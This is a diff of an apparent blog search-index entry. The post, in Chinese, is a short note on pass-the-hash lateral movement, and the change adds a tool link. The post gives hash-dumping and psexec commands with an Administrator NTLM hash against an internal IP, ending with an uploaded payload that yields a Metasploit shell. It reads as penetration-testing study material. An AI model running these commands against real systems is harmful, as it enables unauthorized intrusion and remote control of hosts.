@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[内网渗透横向移动hash传递注入]]></title>
     <url>%2F2018%2F10%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8hash%E4%BC%A0%E9%80%92%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[在内网渗透中有时候抓不到明文密码，也可以用hash传递注入攻击拿下另一个目标 获取hash工具地址：获取hash1q.exe -dhl hash传递注入先执行whoami命令看看：1psexec.exe Administrator@192.168.3.21 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 看到执行成功的。配合msf使用，开始hash传递注入：1psexec.exe Administrator@192.168.3.21 -c d:\windows.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 说明：d:\windows.exe是本地shell的物理地址，我放到d盘目录下。msf成功获取到shell 总结又学到一个内网渗透技能…]]></content>
+    <content type="text"><![CDATA[在内网渗透中有时候抓不到明文密码，也可以用hash传递注入攻击拿下另一个目标 获取hash工具地址：https://github.com/alone5xiao/hamal.cc获取hash1q.exe -dhl hash传递注入先执行whoami命令看看：1psexec.exe Administrator@192.168.3.21 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 看到执行成功的。配合msf使用，开始hash传递注入：1psexec.exe Administrator@192.168.3.21 -c d:\windows.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 说明：d:\windows.exe是本地shell的物理地址，我放到d盘目录下。msf成功获取到shell 总结又学到一个内网渗透技能…]]></content>
       <categories>
         <category>内网渗透</category>
       </categories>
